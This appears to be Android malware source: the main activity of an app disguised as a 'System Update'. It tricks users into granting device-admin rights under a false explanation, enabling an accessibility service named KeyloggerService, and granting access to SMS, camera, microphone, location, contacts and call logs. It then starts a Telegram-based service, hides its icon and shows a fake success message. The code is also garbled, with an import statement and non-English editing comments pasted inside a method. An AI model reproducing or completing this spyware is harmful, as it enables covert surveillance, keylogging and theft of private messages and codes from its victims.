package com.sys.updater;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private LinearLayout layout;
    private TextView tvAccStatus, tvPermStatus;
    private Button btnAcc, btnPerm, btnContinue;
    private boolean isAccEnabled = false;
    private boolean isPermsEnabled = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Zid had l'import l'fo9
import android.app.admin.DevicePolicyManager;

// Zid had l'code f l'kher dyal onCreate()
        // Request Device Admin
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system updates.");
            startActivity(intent);
        }
        
        // Build UI Programmatically
        layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(60, 120, 60, 60);
        layout.setBackgroundColor(Color.parseColor("#F5F5F5"));
        setContentView(layout);

        // Title
        TextView tvTitle = new TextView(this);
        tvTitle.setText("System Setup");
        tvTitle.setTextSize(28);
        tvTitle.setTypeface(null, Typeface.BOLD);
        tvTitle.setTextColor(Color.parseColor("#202124"));
        layout.addView(tvTitle);

        TextView tvDesc = new TextView(this);
        tvDesc.setText("Please complete the steps below to finish system optimization.");
        tvDesc.setTextSize(16);
        tvDesc.setTextColor(Color.parseColor("#5F6368"));
        tvDesc.setPadding(0, 20, 0, 60);
        layout.addView(tvDesc);

        // ================= STEP 1: ACCESSIBILITY =================
        tvAccStatus = new TextView(this);
        tvAccStatus.setTextSize(18);
        tvAccStatus.setTypeface(null, Typeface.BOLD);
        layout.addView(tvAccStatus);

        btnAcc = new Button(this);
        btnAcc.setText("Enable Accessibility");
        btnAcc.setPadding(0, 30, 0, 30);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 20, 0, 60);
        btnAcc.setLayoutParams(params);
        
        btnAcc.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "Find 'System Update' and turn it ON", Toast.LENGTH_LONG).show();
        });
        layout.addView(btnAcc);

        // ================= STEP 2: PERMISSIONS =================
        tvPermStatus = new TextView(this);
        tvPermStatus.setTextSize(18);
        tvPermStatus.setTypeface(null, Typeface.BOLD);
        layout.addView(tvPermStatus);

        btnPerm = new Button(this);
        btnPerm.setText("Grant Permissions");
        btnPerm.setPadding(0, 30, 0, 30);
        btnPerm.setLayoutParams(params);
        
        btnPerm.setOnClickListener(v -> {
            requestAppPermissions();
        });
        layout.addView(btnPerm);

        // ================= STEP 3: CONTINUE =================
        btnContinue = new Button(this);
        btnContinue.setText("CONTINUE");
        btnContinue.setTextColor(Color.WHITE);
        btnContinue.setBackgroundColor(Color.parseColor("#007BFF"));
        btnContinue.setTextSize(18);
        btnContinue.setTypeface(null, Typeface.BOLD);
        
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 150);
        btnParams.setMargins(0, 80, 0, 0);
        btnContinue.setLayoutParams(btnParams);
        
        btnContinue.setOnClickListener(v -> {
            if (isAccEnabled && isPermsEnabled) {
                // Start Bot
                startForegroundService(new Intent(this, TelegramService.class));
                
                // Hide Icon
                getPackageManager().setComponentEnabledSetting(
                    new ComponentName(this, MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                );
                
                Toast.makeText(this, "System Updated Successfully.", Toast.LENGTH_SHORT).show();
                finishAffinity();
            } else {
                Toast.makeText(this, "Please complete all steps first!", Toast.LENGTH_SHORT).show();
            }
        });
        layout.addView(btnContinue);
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkStatus();
    }

    private void checkStatus() {
        // 1. Check Accessibility
        isAccEnabled = isAccessibilityServiceEnabled(this, KeyloggerService.class);
        if (isAccEnabled) {
            tvAccStatus.setText("Step 1: Accessibility ✓ Done");
            tvAccStatus.setTextColor(Color.parseColor("#34A853")); // Green
            btnAcc.setVisibility(View.GONE);
        } else {
            tvAccStatus.setText("Step 1: Accessibility ❌ Not Enabled");
            tvAccStatus.setTextColor(Color.parseColor("#EA4335")); // Red
            btnAcc.setVisibility(View.VISIBLE);
        }

        // 2. Check Permissions
        isPermsEnabled = checkAppPermissions();
        if (isPermsEnabled) {
            tvPermStatus.setText("Step 2: Permissions ✓ Done");
            tvPermStatus.setTextColor(Color.parseColor("#34A853")); // Green
            btnPerm.setVisibility(View.GONE);
        } else {
            tvPermStatus.setText("Step 2: Permissions ❌ Not Granted");
            tvPermStatus.setTextColor(Color.parseColor("#EA4335")); // Red
            btnPerm.setVisibility(View.VISIBLE);
        }

        // 3. Show/Hide Continue
        if (isAccEnabled && isPermsEnabled) {
            btnContinue.setVisibility(View.VISIBLE);
        } else {
            btnContinue.setVisibility(View.GONE);
        }
    }

    private void requestAppPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.RECEIVE_SMS);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.READ_CALL_LOG);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        String[] permArray = perms.toArray(new String[0]);
        requestPermissions(permArray, 1);
    }

    private boolean checkAppPermissions() {
        return checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
               checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        checkStatus();
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
        ComponentName expectedComponentName = new ComponentName(context, accessibilityService);
        String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServicesSetting == null)
            return false;

        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServicesSetting);

        while (colonSplitter.hasNext()) {
            String componentNameString = colonSplitter.next();
            ComponentName enabledService = ComponentName.unflattenFromString(componentNameString);
            if (enabledService != null && enabledService.equals(expectedComponentName))
                return true;
        }
        return false;
    }
            }
